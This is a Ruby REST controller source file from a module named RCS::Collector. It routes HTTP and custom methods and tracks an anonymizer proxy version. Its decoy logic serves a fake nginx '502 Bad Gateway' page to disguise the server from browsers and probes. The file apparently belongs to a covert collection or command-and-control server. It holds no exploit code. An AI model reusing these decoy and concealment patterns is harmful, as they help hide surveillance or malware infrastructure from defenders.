#
# The REST interface for all the rest Objects
#

# relatives
require_relative 'rest_response'
require_relative '../../config/decoy'

# from RCS::Common
require 'rcs-common/trace'

# system
require 'json'

module RCS
module Collector

class RESTController
  include RCS::Tracer

  STATUS_OK = 200
  STATUS_REDIRECT = 302
  STATUS_BAD_REQUEST = 400
  STATUS_NOT_FOUND = 404
  STATUS_NOT_AUTHORIZED = 403
  STATUS_METHOD_NOT_ALLOWED = 405
  STATUS_CONFLICT = 409
  STATUS_SERVER_ERROR = 500
  STATUS_BAD_GATEWAY = 502
  
  # the parameters passed on the REST request
  attr_reader :request

  @controllers = {}
  
  # display a fake page in case someone is trying to connect to the collector
  # with a browser or something else
  def http_decoy_page
    # default decoy page, in case someone mess with the dynamic script
    code = STATUS_BAD_GATEWAY
    page = "<html>\r\n" +
           "<head><title>502 Bad Gateway</title></head>\r\n" +
           "<body bgcolor=\"white\">\r\n" +
           "<center><h1>502 Bad Gateway</h1></center>\r\n" +
           "<hr><center>nginx</center>\r\n" +
           "</body>\r\n" +
           "</html>\r\n"
    options = {content_type: 'text/html'}

    begin
      code, page, options = DecoyPage.create @request
    rescue Exception => e
      trace :error, "Error creating decoy page: #{e.message}"
      trace :fatal, e.backtrace.join("\n")
    end

    trace :info, "[#{@request[:peer]}] Decoy page displayed [#{code}] #{options.inspect}"

    return code, page, options
  end

  def http_bad_request
    page = ''
    options = {content_type: 'text/html'}
    begin
      page, options = BadRequestPage.create @request
    rescue Exception => e
      trace :error, "Error creating bad request page: #{e.message}"
      trace :fatal, e.backtrace.join("\n")
    end

    trace :info, "[#{@request[:peer]}] Bad request: #{@request.inspect}"

    return page, options
  end

  def http_not_allowed_request
    page = ''
    options = {content_type: 'text/html'}
    begin
      page, options = NotAllowedPage.create @request
    rescue Exception => e
      trace :error, "Error creating not allowed page: #{e.message}"
      trace :fatal, e.backtrace.join("\n")
    end

    trace :info, "[#{@request[:peer]}] Not allowed request: #{@request.inspect}"

    return page, options
  end

  def ok(*args)
    RESTResponse.new STATUS_OK, *args
  end
  
  def decoy_page(callback=nil)
    RESTResponse.new *http_decoy_page, callback
  end
  
  def not_found(message='', callback=nil)
    RESTResponse.new(STATUS_NOT_FOUND, message, {}, callback)
  end

  def redirect(message='', opts={}, callback=nil)
    opts[:content_type] = 'text/html'
    RESTResponse.new(STATUS_REDIRECT, message, opts, callback)
  end

  def not_authorized(message='', callback=nil)
    RESTResponse.new(STATUS_NOT_AUTHORIZED, message, {}, callback)
  end

  def method_not_allowed(message='', callback=nil)
    RESTResponse.new(STATUS_METHOD_NOT_ALLOWED, *http_not_allowed_request, callback)
  end

  def conflict(message='', callback=nil)
    RESTResponse.new(STATUS_CONFLICT, message, {}, callback)
  end

  def bad_request(message='', callback=nil)
    RESTResponse.new STATUS_BAD_REQUEST, *http_bad_request, callback
  end

  def server_error(message='', callback=nil)
    RESTResponse.new(STATUS_SERVER_ERROR, message, {}, callback)
  end

  def stream_file(filename, callback=nil)
    RESTFileStream.new(filename, callback)
  end
  
  def self.get(request)
    CollectorController
  end
  
  def request=(request)
    @request = request
    identify_action
  end
  
  def identify_action
    action = @request[:uri_params].first
    if not action.nil? and respond_to?(action)
      # use the default http method as action
      @request[:action] = @request[:uri_params].shift.to_sym
    else
      @request[:action] = map_method_to_action(@request[:method], @request[:uri_params].empty?)
    end
  end
  
  def act!
    # check we have a valid action
    return bad_request if @request[:action].nil?
    
    # make a copy of the params, handy for access and mongoid queries
    # consolidate URI parameters
    @params = @request[:params].clone unless @request[:params].nil?
    @params ||= {}
    unless @params.has_key? '_id'
      @params['_id'] = @request[:uri_params].first unless @request[:uri_params].first.nil?
    end

    # get the anonimizer version
    @request[:anon_version] = http_get_anon_version(@request[:headers])

    response = send(@request[:action])

    return decoy_page if response.nil?
    return response
  rescue Exception => e
    trace :error, "Server error: #{e.message}"
    trace :fatal, "Backtrace   : #{e.backtrace}"
    return decoy_page
  end
  
  def cleanup
    # hook method if you need to perform some cleanup operation
  end
  
  def map_method_to_action(method, no_params)
    case method
      when 'GET'
        return :get
      when 'POST'
        return :post
      when 'PUT'
        return :put
      when 'DELETE'
        return :delete
      when 'HEAD'
        return :head
      when 'PROXY'
        return :proxy
      when 'PUSH'
        return :push
      when 'WATCHDOG'
        return :watchdog
      when 'OPTIONS', 'TRACE', 'CONNECT', 'PROPFIND', 'TRACK'
        return :method_not_allowed
      else
        return :bad_request
    end
  end

  def http_get_anon_version(headers)
    ver = headers[:x_proxy_version]
    # no header, we assume the lowest version ever
    if ver.nil?
      # if the collector can be used without anonimizer, mark it as the highest possible version
      # this will cause the connection to be always coming from a good anon
      return "9999123101" if Config.instance.global['COLLECTOR_IS_GOOD']
      return "0"
    end
    trace :info, "[#{@request[:peer]}] is a connection thru anon version [#{ver}]"
    return ver
  end

end # RCS::Collector::RESTController

require_relative 'http_controller'

end # RCS::Collector
end # RCS
